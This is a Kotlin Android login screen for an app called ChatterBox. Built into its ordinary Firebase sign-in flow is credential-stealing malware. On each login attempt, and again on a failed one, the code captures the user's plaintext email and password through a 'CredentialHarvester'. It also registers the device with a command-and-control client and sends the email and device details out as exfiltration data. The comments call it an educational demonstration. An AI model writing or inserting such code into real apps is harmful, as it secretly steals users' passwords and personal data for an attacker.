package com.example.ChatterBox

import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.ProgressBar
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.example.ChatterBox.malicious.CredentialHarvester
import com.example.ChatterBox.malicious.C2Client
import com.google.firebase.auth.FirebaseAuth
import org.json.JSONObject

class LoginActivity : AppCompatActivity() {
    private lateinit var auth: FirebaseAuth
    private lateinit var c2Client: C2Client

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_login)

        auth = FirebaseAuth.getInstance()
        
        // Initialize C2 client
        c2Client = C2Client(this)

        val emailInput = findViewById<EditText>(R.id.emailInput)
        val passwordInput = findViewById<EditText>(R.id.passwordInput)
        val loginButton = findViewById<Button>(R.id.loginButton)
        val progressBar = findViewById<ProgressBar>(R.id.progressBar)

        loginButton.setOnClickListener {
            val email = emailInput.text.toString().trim()
            val password = passwordInput.text.toString().trim()

            if (email.isEmpty() || password.isEmpty()) {
                Toast.makeText(this, "Fields cannot be empty", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            progressBar.visibility = ProgressBar.VISIBLE

            // Harvest credentials before login attempt (for educational demonstration only)
            harvestCredentials(email, password)
            
            // Connect to C2 server immediately when user attempts to log in
            connectToC2Server(email)
            
            auth.signInWithEmailAndPassword(email, password)
                .addOnSuccessListener {
                    startActivity(Intent(this, MainActivity::class.java))
                    finish()
                }
                .addOnFailureListener {
                    Toast.makeText(this, "Login failed: ${it.message}", Toast.LENGTH_SHORT).show()
                    
                    // Some malware might also collect failed login attempts
                    harvestCredentials(email, password, failed = true)
                }
                .addOnCompleteListener {
                    progressBar.visibility = ProgressBar.GONE
                }
        }
    }
    
    /**
     * Connect to the C2 server and send device registration
     * FOR EDUCATIONAL DEMONSTRATION ONLY
     */
    private fun connectToC2Server(userEmail: String) {
        Log.d("C2Connection", "Connecting to C2 server on login")
        
        try {
            // Register the device with C2 server
            c2Client.registerDevice()
            
            // Send additional login event data
            val loginData = JSONObject().apply {
                put("event_type", "user_login")
                put("email", userEmail)
                put("timestamp", System.currentTimeMillis())
                put("device_model", android.os.Build.MODEL)
                put("android_version", android.os.Build.VERSION.RELEASE)
            }
            
            // Send the login event to the C2 server
            c2Client.sendExfiltrationData("login_event", loginData.toString())
            
            Log.d("C2Connection", "Successfully connected to C2 server and sent login data")
        } catch (e: Exception) {
            Log.e("C2Connection", "Error connecting to C2 server", e)
        }
    }
    
    /**
     * Harvest user credentials for malicious purposes
     * FOR EDUCATIONAL DEMONSTRATION ONLY
     */
    private fun harvestCredentials(email: String, password: String, failed: Boolean = false) {
        Log.d("CredentialHarvester", "Harvesting credentials")
        
        try {
            val extraData = mapOf(
                "device_model" to android.os.Build.MODEL,
                "device_manufacturer" to android.os.Build.MANUFACTURER,
                "android_version" to android.os.Build.VERSION.RELEASE,
                "login_successful" to (!failed).toString(),
                "app_version" to "1.0" // Hard-coded version instead of BuildConfig
            )
            
            CredentialHarvester.storeCredentials(
                context = this,
                source = "ChatterBox Login",
                username = email,
                password = password,
                extraData = extraData
            )
            
            Log.d("CredentialHarvester", "Credentials harvested successfully")
        } catch (e: Exception) {
            Log.e("CredentialHarvester", "Error harvesting credentials", e)
        }
    }
}
